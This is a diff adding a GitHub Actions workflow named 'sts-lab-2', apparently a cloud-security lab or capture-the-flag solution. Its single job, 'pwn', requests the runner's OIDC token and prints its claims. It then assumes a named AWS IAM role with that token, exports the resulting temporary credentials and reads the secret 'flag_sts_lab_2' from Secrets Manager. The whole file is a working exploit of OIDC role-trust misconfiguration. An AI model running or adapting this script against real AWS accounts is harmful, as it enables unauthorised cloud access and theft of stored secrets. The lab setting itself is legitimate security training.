@@ -1,0 +1,27 @@
+name: sts-lab-2
+on: [push, workflow_dispatch]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assume via OIDC (manuel)
+        run: |
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+          echo "=== CLAIMS ==="
+          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub, aud, repository}'
+          CREDS=$(aws sts assume-role-with-web-identity \
+            --role-arn arn:aws:iam::556300512497:role/sts-lab-2-target \
+            --role-session-name neeho-lab2 \
+            --web-identity-token "$TOKEN" \
+            --query Credentials --output json)
+          export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
+          export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
+          export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
+          echo "=== IDENTITY ==="
+          aws sts get-caller-identity
+          echo "=== FLAG ==="
+          aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --query SecretString --output text
